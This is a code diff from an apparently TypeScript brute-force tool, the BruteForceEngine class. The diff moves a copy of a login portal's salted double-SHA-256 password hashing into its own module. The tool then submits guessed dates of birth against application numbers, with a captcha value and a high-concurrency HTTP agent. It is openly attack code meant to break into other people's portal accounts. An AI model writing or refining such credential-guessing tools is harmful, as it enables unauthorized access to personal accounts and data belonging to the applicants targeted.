@@ -1,7 +1,7 @@
 import axios from 'axios';
 import https from 'https';
-import crypto from 'crypto';
 import { CONFIG, HEADERS } from './config';
+import { encryptPortalPassword } from './crypto/password-hash';
 import { SessionManager } from './session';
 import { AuthResult } from './types';
 import { logger } from './logger';
@@ -16,16 +16,6 @@ export class BruteForceEngine {
     keepAlive: true,
     maxSockets: 50,
   });
-
-  private encryptPassword(password: string, salt: string): string {
-    const hash1 = crypto.createHash('sha256').update(password).digest('hex').toUpperCase();
-    const hash2 = crypto
-      .createHash('sha256')
-      .update(hash1 + salt)
-      .digest('hex')
-      .toUpperCase();
-    return hash2;
-  }
 
   async testCombination(
     appNo: string,
@@ -42,7 +32,7 @@ export class BruteForceEngine {
 
     const payload = new URLSearchParams({
       ApplicationNo: appNo,
-      Password: this.encryptPassword(dob, session.salt),
+      Password: encryptPortalPassword(dob, session.salt),
       Captcha1: session.captcha,
     });
 
